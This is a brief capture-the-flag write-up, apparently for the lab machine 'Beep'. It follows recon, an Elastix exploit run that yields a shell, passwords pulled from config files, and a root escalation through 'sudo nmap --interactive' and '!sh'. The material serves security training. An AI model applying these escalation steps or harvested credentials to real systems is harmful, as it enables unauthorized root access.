# BEEP

### RECON
Found in nmap:
- root@localhost.localdomain
- http-title: Elastix

ssl is too low need to change browser for burpsuite to access 
- http (redirect to https)
- https
- :10000

found elastix cve need to edit /etc/ssl/openssl.cnf in order to not be blocked because of ssl version 

```
python2 elastix_cve.py
```

we have a shell 

```
bash-3.2$ whoami
asterisk
```

we have user.txt here

### OS RECON 
```
/var/www/html/vtigercrm/config.db.php:  $dbconfig['db_password'] = '_DBC_PASS_';
/var/www/html/vtigercrm/config.inc.php:$dbconfig['db_password'] = 'vtiger2007';
```

elastix password admin:jEhdIekWmdjE

we actually need no more than sudo -l 
```
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```
```
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# whoami
root
```

